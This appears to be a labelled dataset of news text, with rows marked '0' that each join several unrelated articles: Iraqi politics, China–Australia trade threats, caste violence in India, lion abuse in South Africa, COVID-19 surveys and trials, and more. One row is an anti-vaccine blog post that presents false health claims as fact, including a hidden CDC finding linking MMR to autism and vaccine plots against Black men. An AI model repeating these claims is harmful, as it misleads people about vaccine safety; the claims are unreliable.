0,"Former communications minister Mohammed Allawi was named prime minister-designate by rival Iraqi factions Saturday after weeks of political deadlock, three officials said. The choice comes as the country weathers troubled times, including ongoing anti-government protests and the constant threat of being ensnared by festering U.S.-Iran tensions. The selection of Allawi, 66, to replace outgoing Prime Minister Adel Abdul-Mahdi was the product of many backroom talks over months between rival parties. On Wednesday, President Barham Saleh gave parliamentary blocs until Feb. 1 to select a premier candidate, or said he would exercise his constitutional powers and choose one himself. In a pre-recorded statement posted online, Allawi called on protesters to continue with their uprising against corruption and said he would quit if the blocs insist on imposing names of ministers. ""If it wasn't for your sacrifices and courage there wouldn't have been any change in the country,"" he said addressing anti-government protesters. ""I have faith in you and ask you to continue with the protests."" Allawi was born in Baghdad and served as communications minister first in 2006 and again between 2010-2012. He resigned from his post after a dispute with former Prime Minister Nouri al-Maliki. Parliament is expected to put his candidacy to a vote in the next session, after which point he has 30 days to formulate a government program and select a cabinet of ministers. According to the constitution, a replacement for Abdul-Mahdi should have been identified 15 days after his resignation in early December. Instead, it has taken rival blocs nearly two months of jockeying to select Allawi as their consensus candidate. Abdul-Mahdi's rise to power was the product of a provisional alliance between parliament's two main blocs — Sairoon, led by cleric Muqtada al-Sadr, and Fatah, which includes leaders associated with the paramilitary Popular Mobilization Units headed by Hadi al-Amiri. In the May 2018 election, neither coalition won a commanding plurality, which would have enabled it to name the premier, as stipulated by the Iraqi constitution. To avoid political crisis, Sairoon and Fatah forged a precarious union with Abdul-Mahdi as their prime minister. Until Allawi's selection, al-Sadr had rejected the candidates put forward largely by Fatah, officials and analysts said. Sairoon appears to have agreed to his candidacy following a tumultuous two week after the radical cleric held an anti-U.S. rally attended by tens of thousands and withdrew support for Iraq's mass anti-government protest movement, only to reverse the decision later. ""Sairoon has approved and Fatah has approved,"" a senior Iraqi official said. If elected by parliament, Allawi will have to contend with navigating Iraq through brewing regional tensions between Tehran and Washington. Tensions skyrocketed after a U.S. drone strike near Baghdad's airport killed top Iranian general Qassem Soleimani and senior Iraqi militia commander Abu Mahdi al-Muhandis. The tumultuous event brought Iraq close to the brink of war and officials scrambling to contain the fallout. The presence of U.S. troops on Iraqi soil has become the focus of Iraqi politics in the wake of the strike. Parliament passed a non-binding resolution for their ouster and Abdul-Mahdi had openly supported withdrawal. Abdul-Mahdi's resignation was precipitated by ongoing mass protests in Baghdad and southern Iraq. Protesters are calling for new executive leadership, snap elections and electoral reforms. They have said they would not accept a candidate chosen by the political establishment. Audience Relations, CBC P.O.

Chinese ambassador to Australia, Cheng Jingye, said in a newspaper interview on Monday the “Chinese public” could avoid Australian products and universities. Australia last week called for all members of the World Health Organization (WHO) to support an independent review into the origins and spread of the coronavirus, and is lobbying world leaders. China’s foreign ministry has attacked the proposal. “Maybe the ordinary people will say ‘Why should we drink Australian wine? Eat Australian beef?” Cheng said in the interview published on the front page of The Australian Financial Review. Cheng said it was possible that tourists may have “second thoughts” about visiting Australia. “The parents of the students would also think ... whether this is the best place to send their kids,” he added. After energy exports, education and tourism are Australia’s biggest export industries, with China the largest market. Payne said in a statement on Monday that Australia had made a “principled call” for an independent review of the COVID-19 outbreak which started in the Chinese city of Wuhan. “We reject any suggestion that economic coercion is an appropriate response to a call for such an assessment, when what we need is global cooperation,” Payne said. China is the largest export market for Australian wine and beef. During strained diplomatic relations with China in 2018, Australian wine faced import delays in China and some Australian beef exports were also previously suspended for a period. The Chinese embassy in Australia has previously warned Chinese students about what it said were safety risks in travelling to Australia. Payne said an “honest assessment” of the pandemic would seek to strengthen the WHO’s role. Chinese foreign ministry spokesman Geng Shuang dismissed calls for an investigation during a daily briefing in Beijing, though not commenting specifically about Australia. “China is the first country to report a COVID case, but it doesn’t mean the virus originated in China,” he told reporters. “Some people are trying to hype up the so-called investigation that is inconsistent with an international atmosphere of cooperation and their political manoeuvring will not succeed.” The novel coronavirus has infected 2.97 million people worldwide and killed more than 205,000, a Reuters tally shows.

Published: 11th October 2020 07:48 AM | Last Updated: 11th October 2020 08:38 AM | A+A A- Activists hold placards and shout slogans during a protest against the death of Hathras gang rape victim. (Photo | PTI) JAIPUR/PATNA: A Dalit woman in Bhopar village of Rajasthan’s Dausa district was allegedly raped by two boys, Mahendra and Jeetram, belonging to the Gujjar community in July 2019. When her family members lodged an FIR, the dominant caste was so enraged that they burnt her house, thrashed her family members and even threatened to kill all of them. Petrified by the repeated threats, the victim and her family fled to Mahua town, about 10 km from their village, where they eke out a living as labourers earning only Rs 500-600 a day. “Our family members were beaten and our house was burnt down. We were threatened that we would be killed if we did not leave the village. The police took money from the accused and did not help us. The government also did not give us any compensation,” said Mahesh Chand, the victim’s brother-in-law. The Dausa family’s troubles only underline what many Dalit victims of atrocities face. Just like the Hathras rape victim’s family, which has alleged that Thakurs, the community to which the accused belong, are threatening them to leave the village, the travails of many Dalit families who face atrocities do not end with the crime committed against them. The upper castes hound the Dalits to such an extent that many are forced to flee their village and relocate elsewhere, where they struggle for a living without government support. In the same Dausa district, five men in a car allegedly raped a minor during a wedding ceremony at her neighbourhood in June 2017 in Dhigariya Kapur village. Some of the accused belonged to the upper caste. After an FIR was registered, the victim’s family was threatened and told to settle the case. But when they did not, the threats increased to such an extent that the minor’s family fled to the neighbouring Bharatpur district. “We had to leave the village as we couldn’t live with the culprits around us. They would stalk us on trial dates. They also forcibly took away our 4 bighas of land. My father now runs a small tea stall,” the victim’s brother said. Yet another rape victim and her family had to flee Bharatpur and live in Jaipur. The 50-year-old woman still recalls the day in June 1998 when a strongman in her village, Attar Singh Gujjar, found her working alone in her farm and raped her. When she went to file an FIR, the local toughies colluded with the police and stalled the registration of an FIR, she alleged. But her troubles didn’t end there. In 2002 when she became a ward panch in Bharatpur’s Gothasar Bair tehsil, Attar Singh, who had raped her in 1998, was the sarpanch. When she pointed out some irregularities and complained to the IG Police of Bharatpur against Attar Singh, he and his goons beat her husband so severely that he lost both his legs. In 2014, families left Gaya after murder of Dalit youth The six culprits were sent to a seven-year jail term. But when they were released after three months, they began threatening her. The police failed to provide any protection and eventually they were forced to flee the village. These kinds of examples are not restricted to Rajasthan alone. In Bihar, too, Dalits have had to flee in fear. In 2014, a dozen lower caste families had to leave Bihar’s Gaya district following the murder of a Dalit youth. Arjun Manjhi. He was killed allegedly after he filed his nomination papers to contest the panchayat elections. A non-governmental organisation in Jaipur, the Centre for Dalit Human Rights, has submitted a list of 17 documented cases to the Rajasthan High Court in which Dalit families had to flee their homes following threats from powerful upper castes. “The governmental system has not changed and there is no political will to tackle such atrocities. As a result, the administration remains a mute spectator as powerful castes continue to oppress Dalits and other weaker sections,” said Satish Kumar, the centre’s director. Take over Hathras probe, Centre asks CBI The Centre has issued a notification for the CBI to take over the probe into the alleged gang-rape and murder of a 20-year-old woman in Hathras in Uttar Pradesh, officials said on Saturday. The notification has been marked to a suitable branch of the premier agency, and probe teams will be dispatched to the crime scene along with forensic experts immediately after the registration of an FIR, they said. The Dalit woman had died of grievous injuries at a Delhi hospital on September 29, a fortnight after she was allegedly raped at her village by four upper-caste men. MHA letter on crimes against women The Centre on Saturday reminded the states and Union Territories of the existing laws for “mandatory action by police in cases of crimes against women.” In an advisory, the Ministry of Home Affairs asked them to ensure strict compliance of laws pertaining to crimes against women and pointed out three sections of the CrPC that deal with “compulsory registration of FIR,” completion of investigation (in relation to rape) within 60 days and a mandatory medical examination with the individual’s consent within 24 hours of receipt of information of such a crime.

0,"Fed Up Democrat Blogging for FREEDOM and CHOICE in New York City: Follow me on Twitter @DemocratFed Frederick Douglass, Dick Gregory, Jamel Holley and beyond! January 19, 2020 — As we celebrate the life and sacrifice of Dr. Martin Luther King Jr. I want to draw attention to all of the brave African American Health Freedom Fighters throughout our history and with us today. While many on this list will be perceived as controversial that is irrelevant: if you are African American and you fight, or have fought, for Health Freedom and Vaccine Choice, you belong on this list. (1) Frederick Douglass I first learned of Frederick Douglass’ opposition to mandatory vaccination from the great Mary Holland. Douglass is, of course, the legendary 19th century African American abolitionist and civil rights leader. Very few people know that Douglass was staunchly opposed to mandatory vaccination. He noted that many who were vaccinated for small pox still died of small pox, so what was the point of the vaccination?! In 1882 Douglass told a reporter that mandatory vaccines encroached on people’s liberty and freedom of choice. (2) Jamel Holley I had never heard of Assemblyman Jamel Holley until January 10, 2020 when he boldly stood against the corrupt New Jersey Democratic party boss Stephen Sweeney. Holley opposed a bill that would have made the religious exemption to vaccination illegal in New Jersey public schools yet still allowed in private religious schools. He opposed the bill as segregationist and racist, which it clearly was. Not only did he oppose the bill, he lobbied his fellow African American legislators and got them to oppose it along with him. Currently Holley is standing firmly not only with the Black Community, but with the Health Freedom Movement as a whole, and my contacts are assuring me that Holley is the real-deal when it comes to Health Freedom and Vaccine Choice. The opportunistic, Big Pharma shill Stephen Sweeney is taking the racist position that Black legislators in New Jersey led by Holley are hurting children by not segregating them; a position that has no evidence to support it. This battle in New Jersey is now ground-zero for for America’s Health Freedom Movement in 2020. Jamel Holley is a brave man who needs and deserves all of our support! (3) Curtis Cost Curtis Cost is by far the most important African American Health Freedom Fighter alive and active today. His 1991 book “Vaccines are Dangerous” was the first book penned by an African American on the topic of vaccine safety. Cost has been educating thousands of people for decades on the safety and efficacy of vaccines and continues his invaluable activism today. His controversial Harlem Vaccine Forum was far and away the most important Health Freedom event of 2019, and he ended the year with the very successful Great Harlem Vaccine Debate. Cost is in the midst of planning resistance and protests to Oprah Winfrey’s Big Pharma sponsored vaccine promotional tour. (4) Dick Gregory The late, great comedian and activist Dick Gregory may be the man responsible for popularizing and spreading the vegan lifestyle within the African American community. Gregory would often appear publicly with Dr. Gary Null to discuss issues of health and healing. While Gregory didn’t always get all of the facts correct when he spoke on matters of health and science, it didn’t matter; that is not what made him so incredibly important. If it wasn’t for him hundreds of thousands, if not millions of African Americans would have never even heard that a vegetarian lifestyle was a healthy option and that vaccination posed immediate dangers. The last few years of his life Gregory had grown very bitter, and when looking at the world around us I can understand why. But I don’t remember Gregory just for the last few years of his life; his legacy is far too powerful for that as he has awoken many people and saved many lives. (5) Virstyne Henry Virstyne Henry is a vaccine-injured Health Freedom Activist. She has been researching the dangers of vaccines ever since she learned her asthma – which she thought was from birth – didn’t arise until after she was given a DTaP vaccine as an infant. Upon realizing this she researched the topic veraciously. Henry participated as a panelist in The Great Harlem Vaccine Debate in December of 2019. She continues to pursue all types of truths on https://www.truthertalk.com/ where you can catch her interviewing many guests on a wide range of topics, especially on the safety and efficacy of vaccines. (6) Nancy Turner Banks Dr. Nancy Turner Banks MD is author of “AIDS, Opium, Diamonds and Empire,” and is a graduate of Harvard Medical School. Trained in surgery, obstetrics, gynecology, and gynecological oncology, she practiced general obstetrics and gynecology for twenty-five years. In addition, she earned an MBA in finance. Banks is an extremely outspoken critic of the CDC’s vaccine schedule for children. (7) Minister Louis Farrakhan The Honorable Minister Louis Farrakhan is nothing if he is not controversial. When his name is mentioned the very first thought to all who devour mainstream media is “antisemitism.” Regardless of these controversies I know for a fact Minister Farrakhan is 100% correct on his stance regarding vaccination as well as fluoridation. Farrakhan and the Nation of Islam (NOI) have helped many truths regarding health and healing to access and assist the Black Community. There are at least two other members of NOI that need to be mentioned here as well. (8) Tony Muhammad Minister Tony Muhammad has been fighting to get the truth out regarding the dangers of vaccines for years. He has protested in front of the CDC Headquarters in Atlanta, Georgia as well as lectured and given multiple interviews on the topic. To quote him directly from the speech he gave in front of CDC Headquarters: “The Pharmaceutical industry is very powerful. They are the richest lobby group in the world. Minister Farrakhan’s love is so deep for Black and oppressed people that no forces on earth can get him to sell our people out. He loves the truth and is a warner to our people.” (9) Rizza Islam Rizza Islam is a young NOI brother who speaks very clearly and boldly, and when it comes to vaccination he pulls no punches stating there is a plot to kill and disable Black men through the childhood vaccination schedule. As wild as that may sound to many people, the movie VAXXED uncovered that the CDC has known for years that the MMR vaccine given at 18 months of age results in an autism rate 340% higher in African American boys than in any other group. Rizza Islam is able to reach many Black youth regarding the dangers of vaccination, and he recognizes that fighting forced vaccination is a universal struggle for all regardless of race, ethnicity, social status, or class. (10) Sheila Ealey Sheila Ealey became internationally known from the movie VAXXED, where she was featured along side her autistic son Temple Ealey. She told her story of how her son was accidentally given 2 MMR shots at the same time. From that point on her boy was never the same again. Ealey has been a strong, passionate voice for Health Freedom and Vaccine Choice ever since. She has traveled the country and the world to help educate and advocate on the dangers of vaccines. To hear this Warrior Mom speak is a true spiritual experience! (11) Dr. Phil Valentine I first heard of the Reverend Dr. Phil Valentine at The Harlem Vaccine Forum. He is extremely knowledgeable and has helped hundreds of African American families receive religious exemptions to vaccination in New York (before the religious exemption law was repealed). Valentine said his exemptions were challenged in court three times by the Department of Education, and all three times he won. When he went to the courts to receive the transcripts for those three cases either the court transcripts had been sealed or lost, according to Valentine. He has a powerful message that covers many topics, including child sex trafficking where he gives a little praise to President Donald Trump for combating the horrifying practice. (12) Dead Prez Stic Man & M1 form the Revolutionary Hip-Hop duo known as “Dead Prez.” While they have never explicitly spoken out against mandatory vaccination it is clearly & loudly implied through the lyrics in their songs and the vegan lifestyles they choose to live. In their song “Be Healthy” they say, “Let your food be your medicine, no excederin, strictly herbs that I raise in the sun ’cause I got melanin…They say you are what you eat, so I strive to eat healthy. My goal in life is not to be rich or wealthy, ’cause true wealth comes from good health and wise ways, we got to start takin’ better care of ourselves.“ In their youth the duo would rhyme about atheism and Marxist Revolution, however as they matured I have been told they have gone deep into Eastern Mysticism exploring and expanding their spiritual quests. (13) Charles Barron Charles Barron is a former Black Panther Party member and a current state Assemblyman representing Brooklyn. He is a member of the Assembly Health Committee in Albany, NY. When the religious exemption to vaccination was up for repeal Barron voted NO in the Health Committee and NO on the floor of the assembly. His words in the Health Committee were clear and powerful. Unfortunately he did not lobby other New York Democrats to join him in voting NO, the way Jamel Holley did and continues to do in New Jersey. (14) Rodneyse Bichotte Rodneyse Bichotte is an Assemblywoman representing Brooklyn and, like Barron, is also a member of the Assembly Health Committee. She also voted NO to repealing the religious exemption to vaccination in both the committee and floor votes. Bichotte stated on the floor of the Assembly that she had been given the MMR vaccine as a child yet still got measles twice after that. She reminded everyone that when the HIV/AIDS epidemic first came on the scene it was wrongly blamed on Haitians, just as unvaccinated children were being blamed for spreading measles today; both of those claims are false and there is no evidence to support either of them. I only wish that the Assemblywoman will take the next, natural step of actively seeking support for Health Freedom from her fellow Democratic colleagues in Albany. (15) Chantel Jackson Chantel Jackson is a Bronx candidate for Assembly that is gaining major endorsements on her path to Albany. She is firmly, and completely, a Health Freedom and Vaccine Choice candidate. She is also a Democrat. The FED UP DEMOCRAT enthusiastically and completely endorses Chantel Jackson! Jackson has spoken firmly in support of allowing religious and philosophical exemptions to vaccination, she has spoken out against making the HPV vaccine mandatory to attend school, and she has expressed reservations regarding a potential coronavirus vaccine. The Daily News reported all of this as if Jackson was out of her mind. However the reality is that Jackson is part of a growing voice of African American female politicians who believe in the principals of Health Freedom and Vaccine Choice. Rodneyse Bichotte and Tremaine Wright are two African American assemblymembers who voted against the repeal of the religious exemption to vaccination on June 13, 2019. Both are from Brooklyn and already hold seats in Albany as they continue to be rising stars in the Democratic Party. Bichotte is now the Democratic Party Boss in Brooklyn, and Wright may be headed for the Senate this election season as Senator Velmanette Montgomery has announced she is leaving her Senate seat and has endorsed Wright to succeed her. Jackson has also been endorsed by Assemblyman Michael Blake, Senator Luis Sepulveda and Senator Brian Benjamin. It is interesting to note all of these endorsements come from Democrats who voted to repeal the religious exemption to vaccination on June 13, 2019 even though Jackson would have never supported such a Draconian measure. The Democratic party in New York is split on this issue and – due to continued Health Freedom activism – the principals of parental choice and medical freedom are gaining traction within the party. *** I am sure there are many important Health Freedom Fighters I left out that belong on this list. Nick Canon is woke too. LikeLike Great article – thanks for sharing! I’m in NJ and watching the situation closely. Proud of Jamel Holley! LikeLike I have to say I am really, really impressed with Jamel Holley. He has come out the gate as a true champion of Health & Religious Freedom. All of the Democrats in New York who supported us never came out full force the way I am seeing Holley come. Holley is helping Health Freedom & Vaccine Choice to become a nationally recognized voting issue. LikeLike Comments are closed. You must be logged in to post a comment."
0,"  Animals, OMG ! Animal cruelty is one of the most disgusting things to ever exist. Though there have been several measures that different communities and organizations take to make sure it doesn’t happen but its a shame to admit that there are places where animals are still treated so poorly. Recently in South African Farm, a case of animal cruelty has been reported where 108 diseased and abused lions were found. According to the people in South Africa, it is the most shocking case of animal neglect that they have ever witnessed. More Info: Human Society International   The news went viral when an anonymous source posted the pictures of the abused lions on the internet. The lions apparently lost all the fur which is said to be the result of a disease called mange, which is a skin disease caused by parasite mites. The lions were kept in an overcrowded facility. 30 lions were kept in the space that was only meant for two. You can imagine the amount of animal neglect that these lions had to face. The environment that they were kept in was very filthy. We can imagine the condition of these abused lions through these pictures. After this news came in light, Douglas Wolhunter, the manager of the National Council for Societies for the Prevention of Cruelty to Animals (NSPCA), visited the South African farm and said, “It’s hard to describe because it leaves you feeling hollow, knowing that you’ve got the king of the jungle in conditions like that. It’s soul-destroying.”  The particular South African Farm is called the Pienika form. Upon investigation it was found that there has been more than 100 abused lions, caracal, leopards, and tigers were kept there and were found in horrendous condition.  It is important for any breeding farm to provide a clean and hygienic atmosphere to the lions as well as to let the cubs have proper nourishment. Naturally, the cubs stay for 18 months with their mothers. But the condition of this South African farm does not provide them with any of their necessity.  The Wildlife Director at Humane Society International, Audrey Delsink, said: ‘South Africa’s captive lion breeding industry is a vicious cycle of exploitation, from cradle to grave.” ‘Lion cubs are ripped from their mothers at just a few days old, to be hand-reared by paying volunteers from countries around the world such as the United Kingdom, who are misled into believing the cubs are orphans. The cubs have exploited their whole lives, first as props by paying tourists looking for selfie shots whilst petting or bottle-feeding the animals, then later as part of ‘walking with lion’ safaris.’  He continued by saying, “In the face of so much evidence supporting the significant welfare atrocities and illegal activities, and the bogus standards presented by the industry, the South African government cannot stand idle. ‘We demand that the government shut down this industry once and for all; that is the only way brand South Africa can recover from this significant scourge.”  Read More: China’s Youngest Coronavirus Patient Recovers From The Disease Without Medication  No One Cares “No One Cares” Is a Part Of Psifiako Media Pvt.

The Chief Justice remarked that the same argument could be raised in the case of the Muslim community as well, and added that the court will therefore have to hear the matter in detail. The petition wants the court to declare as unconstitutional paragraph (3) of the Constitution (Scheduled Castes) Order, 1950, which states, “…no person who professes a religion different from Hinduism, Sikhism and Budhism shall be deemed to be a member of a scheduled caste.” The plea sought delinking of religion from consideration of Scheduled Caste status, and making the SC category relgion neutral. 📣 The Indian Express is now on Telegram.

Image: Reuters South African scientists will be monitoring developments in Brazil which is also about to resume a large COVID-19 vaccine clinical trial. Brazil will embark on a study similar to the one which started in South Africa this week, that hopes to effectively respond to the global pandemic. The trial aims to find a vaccine that will prevent infection from SARS-CoV-2, the virus that causes COVID-19 in HIV-infected and HIV-uninfected individuals. Professor of Vaccinology at Wits University, Shabir Madhi, who is also the leader of the vaccine trial in South Africa says while South Africa and Brazil have similarities, the COVID-19 response has been totally different and they are hoping for better outcomes in South Africa. “South Africa has been much more aggressive than Brazil in terms of trying to slow the rate of transmission of the virus, but these are both complex societies, both Brazil as well as SA. I don’t think it’s a correct thing to make comparisons between countries. It is unfortunate that Brazil seems to be ahead of the curve compared to where we are in SA and we can only hope that what we experience in SA in the next month doesn’t sort of mirror what is happening in Brazil at this point in time,” says Madhi. While all hopes are for a successful vaccine at the end of the trial, it might be halted midway should challenges emerge. Madhi says an Independent Data Safety Monitoring Committee is watching the trials in the United Kingdom, South Africa and Brazil. On Wednesday, South Africa joined various parts of the world in beginning vaccine trials for COVID-19. The large-scale vaccine trial will see 2000 participants between the ages of 18-65 be enrolled, half will be given the vaccine, while the other half will be administered a placebo. The trial is funded by the Bill Gates Foundation through its partnership with the South African Medical Research Council. In this video, the first eight participants in a COVID-19 trial are vaccinated The total number of confirmed COVID-19 cases in South Africa is 124 590. 1 493 104 tests have been completed in total, of which 33 092 new tests are reported. A further 48 COVID-19 related deaths have been reported: 8 from the Eastern Cape and 40 from the Western Cape. This brings the total number of deaths to 2 340. The number of recoveries is 64 111 which translates to a recovery rate of 51,5%. INFOGRAPHIC: South Africa COVID-19 cases   SABC © 2022 © 2022"
0,"HOT: » Greek Ambassador: Bulgaria is our Most Important Economic and Trade partner in the Region #AmbassadorTalks  The spread of the infectious coronavirus has been a major topic in the world media in recent weeks. 82% of respondents from the Bulgarian National Panel in a Nielsen Admosphere Bulgaria survey say they have come across news related to the topic. Although a large proportion of respondents are concerned about the possibility of a global epidemic and the possible spread of the virus in Bulgaria, just under half of those surveyed feel personally threatened. This explains why half of the respondents have not taken any precautionary measures so far. The Nielsen Admosphere Bulgaria survey was conducted among active internet users participating in the Bulgarian National Panel from February 3-17, 2020. The panel is part of the European National network operating in the Czech Republic, Slovakia, Poland and Hungary. A similar type of coronavirus study was also conducted in these 4 countries. Most of the Bulgarians (82%) came across news regarding the new coronavirus that appeared in the Chinese city of Wuhan late last year, and has infected tens of thousands of people so far. In recent weeks, there have been conversations for a global threat, prompting many countries to take various measures, such as the cancellation of direct flights from China and the installation of thermal cameras at airports. 71% of Bulgarians are worried about the possibility of a global epidemic - women (80%) are more worried than men (62%) as well as younger age groups. About 80% of people between the ages of 15 and 44 share a concern about this. For comparison - 65% of the people over 45 share these concerns. The concern that the virus could start spreading in Bulgaria is a little higher - 75%, with women again expressing a stronger attitude towards men on this issue, along with the younger ones up to the age of 44. Just under half of the respondents gave a positive response to the question whether they actually feel threatened by the coronavirus. This seems to be a result of the lack of confirmed cases of infected in Bulgaria so far. However, half of the people still do not consider it necessary to take preventative measures in relation to the spread of the virus. However, 30% of respondents are considering taking some action in the near future, and 20% have already taken some measures, such as wearing a mask in public and increased compliance with personal hygiene.

0,"Former Deputy Prime Minister Barnaby Joyce says the proposed sale of a large proportion of the dairy industry to a Chinese company could put “pressure” on the capacity of Australia to produce fresh milk for consumers. China dairy giant Mengniu recently received approval from the ACCC to buy parts of the Australian dairy industry for $1.5 billion. Mr Joyce told Sky News host Chris Kenny he wanted to make sure “Australian industries are Australian owned”. “When you get an excess of 70 per cent which is foreign owned you’re starting to have… your own domestic control taken away”. He said the main danger of the sale was that the mechanism of pricing in Australia could become determined by the “whims of those who are overseas”. According to Mr Joyce, if a large section of the dairy industry were operated by a multinational company, the Australian market could be supplied by imported produce from any corner of the world. Mr Joyce said this would be an “affliction on our own sovereignty and ability to deliver to our own people our own milk”. Image: Getty Read More Our Apps"
0,"  The communist government in Bulgaria wasted the strategic chance of the Bulgarian community in Albania to study its mother tongue in schools  In 1948 Bulgaria refusedto send teachers for the Bulgarian community in Albania, which was subsequently subjected to Macedonization. Assoc. Prof. Spas Tashev reveals such little-known facts in the newly printed first book of his research - “Bulgarian communities in the Western Balkans. Political processes and ethnic-demographic consequences (1913-2019).” The scientist follows the ethnic-demographic processes in more than 30 settlements in Albania, where people communicate in an archaic Bulgarian dialect.  After the end of the Second World War and the change of regimes, the Bulgarian state missed a historical chance to establish the Bulgarian literary language in Bulgarian-inhabited Albania. The government wasted two opportunities in a time when the Yugoslavian emissaries were trying to tear off Pirin Macedonia from Bulgaria and annex Albania as the seventh republic of their own country. “As extraordinary as it may sound, the first resistance in the Balkans against such Yugoslavian politics came from Albania, when Enver Hodzha, the head of state, visited Bulgaria in 1947,” explains Assoc. Prof. Spas Tashev from the Institute for Population and Human Studies in the Bulgarian Academy of Sciences. “During an extensive discussion, he proposed that Bulgaria should send teachers to Albania. The Central Committee of the Bulgarian Communist Party responded to the initiative with a year delay, but during that time, the chairman of the committee assigned to discuss the issue at hand – Traycho Kostov - falls into disfavour, due to his conflict with Stalin, and Bulgaria misses its strategic chance to affirm Bulgarian presence and language in Albania.”   According to the historian, sending Bulgarian teachers would have resulted in an alternative to the Macedonization – the introduction of a Macedonian language subject in schools, conducted by Yugoslavia. Such an alternative would have ultimately influenced the Central Balkans at large. The political conjuncture, however, prevailed and Bulgaria’s chance was left unexploited. In 1955, Albania did once again turn to Bulgaria with a request to send textbooks for the Bulgarian population. But again to no avail, as the government overlooked this opportunity for opposing the attempts of the ethnic transformation of the Bulgarians on these lands.Then, on the basis of a Bulgarian Prespa dialect and through a self-sown practice and the official Bulgarian alphabet, an original regiolect came along, which was used by the Bulgarians in Albania up until 1991.  According to Assoc. Prof. Spas Tashev, with the establishment of a democratic state in Albania, new processes of gaining self-awareness in the community begin. He is assured that Bulgarians in Albania have never been discriminated against. In 1991, the first Bulgarian associations were registered there, two years later - the first young Bulgarians from Albania arrived here to study in Bulgarian universities. That is when purposeful actions towards official recognition of the Bulgarian minority in Albania began, which were crowned with success in 2017. Today, studying literary Bulgarian language is a priority of the national community in foreign Albania - there are three Bulgarian Sunday schools, and more than 700 young people have graduated from Bulgarian universities. In the upcoming months, the Bulgarian community will be facing a new obstacle - to protect its ethnic presence in the Albanian census. According to the available data, in the moment there are 50 thousand native Bulgarian speakers in Albania. Nevertheless, whether they would declare themselves as Bulgarians in the surveys is dependent on numerous factors, but most importantly on Bulgarian diplomacy, which has the task of requiring control from the Albanian authorities with the purpose of hindering any attempts to replace the national identity of Bulgarians there.

0,"Discover Thomson Reuters By Kirsty Needham 3 Min Read SYDNEY (Reuters) - Australian Foreign Minister Marise Payne has cautioned China against attempts at “economic coercion” as Australia pushes for an investigation into the coronavirus pandemic that China opposes. Chinese ambassador to Australia, Cheng Jingye, said in a newspaper interview on Monday the “Chinese public” could avoid Australian products and universities. Australia last week called for all members of the World Health Organization (WHO) to support an independent review into the origins and spread of the coronavirus, and is lobbying world leaders. China’s foreign ministry has attacked the proposal. “Maybe the ordinary people will say ‘Why should we drink Australian wine? Eat Australian beef?” Cheng said in the interview published on the front page of The Australian Financial Review. Cheng said it was possible that tourists may have “second thoughts” about visiting Australia. “The parents of the students would also think ... whether this is the best place to send their kids,” he added. After energy exports, education and tourism are Australia’s biggest export industries, with China the largest market. Payne said in a statement on Monday that Australia had made a “principled call” for an independent review of the COVID-19 outbreak which started in the Chinese city of Wuhan. “We reject any suggestion that economic coercion is an appropriate response to a call for such an assessment, when what we need is global cooperation,” Payne said. China is the largest export market for Australian wine and beef. During strained diplomatic relations with China in 2018, Australian wine faced import delays in China and some Australian beef exports were also previously suspended for a period. The Chinese embassy in Australia has previously warned Chinese students about what it said were safety risks in travelling to Australia. Payne said an “honest assessment” of the pandemic would seek to strengthen the WHO’s role. Chinese foreign ministry spokesman Geng Shuang dismissed calls for an investigation during a daily briefing in Beijing, though not commenting specifically about Australia. “China is the first country to report a COVID case, but it doesn’t mean the virus originated in China,” he told reporters. “Some people are trying to hype up the so-called investigation that is inconsistent with an international atmosphere of cooperation and their political manoeuvring will not succeed.” The novel coronavirus has infected 2.97 million people worldwide and killed more than 205,000, a Reuters tally shows.

0,"File photo of Finance Minister Nirmala Sitharaman. The BJP hit out at Congress leaders Rahul Gandhi and Priyanka Gandhi Vadra on Saturday for their ""selective outrage"" in cases of atrocities against women as it questioned their ""silence"" over the alleged rape and killing of a six-year-old girl in Punjab. Noting that the young girl belonged to a Dalit migrant family from Bihar, Finance Minister and senior BJP leader Nirmala Sitharaman also took a swipe at Rashtriya Janata Dal (RJD) leader Tejashwi Yadav, questioning if he had asked Rahul Gandhi about the issue while holding a joint poll campaign with him in the state.  Attacking Yadav, she referred to a news report of 2008 to talk about the ""allegations of eve-teasing and misbehaviour with women against the RJD brothers"", a reference to him and his elder brother Tej Pratap. ""It (the Punjab incident) may not hurt the RJD because that is how things were when they were in power,"" Sitharaman told reporters while flaying Lalu Prasad Yadav's party for the ""jungle raj"" during its rule in Bihar during 1990-2005.  Hitting out at the Congress, she said, ""The pretentious Congress has not said a word. The tweet-friendly Rahul Gandhi has not tweeted on the Hoshiarpur incident. There has been no outrage. And no picnic either."" Her ""picnic"" jibe was in reference to Rahul Gandhi and his sister Priyanka Gandhi's visit to Hathras in BJP-ruled Uttar Pradesh following the alleged gangrape of a Dalit girl, who died in a Delhi hospital subsequently. The BJP had accused Rahul Gandhi and Priyanka Gandhi of practising ""political tourism"".  ""The Congress party should stand up and answer. Does this kind of selective outrage suit the stature of their party? ""Why is the brother-sister pair not going and voicing horror in Hoshiarpur? Why not in Rajasthan? The selective cry of outrage that the Congress wants to show when it is elsewhere but not in states governed by it is completely exposed,"" Sitharaman said. Stating that crimes like rape should not be politicised, she said certain political parties are selective in voicing horror.  Another senior BJP leader and Union minister Prakash Javadekar also slammed the two Congress leaders and asked why had they not paid a visit to the family of the victim in Punjab yet. He accused Rahul Gandhi and Priyanka Gandhi of going on a ""political tour"" to Hathras, as he questioned the lack of a similar reaction from the two leaders to ghastly crimes against women in Punjab and Rajasthan, which are ruled by the Congress.  They go to these places for ""photo-op"", Javadekar said, referring to the Congress leaders' visit to Hathras. ""A six-year-old girl coming from a Dalit migrant family from Bihar was raped and murdered in Punjab's Tanda. Former Union minister Vijay Sampla from our party met the family. Nobody from the Congress met them.  ""They (the Gandhis) cannot see atrocities against women in the states where it (Congress) is in power. Neither Rahul Gandhi nor Priyanka went there and nor was there any comment from its president, Sonia Gandhi,"" he told reporters here. Javadekar also claimed that the culprits in the rape-and-murder case in Punjab have not been arrested yet and demanded stringent action against them.  In a horrifying incident, a six-year-old girl was allegedly raped, killed and then set on fire, with her half-burnt body found at a home in Tanda's Jalalpur village, police said on Thursday. The accused — Gurpreet Singh and his grandfather Surjit Singh — have been arrested on the charges of murder, rape and under other relevant sections of the Indian Penal Code (IPC) and the Protection of Children from Sexual Offences (POCSO) Act, they said."
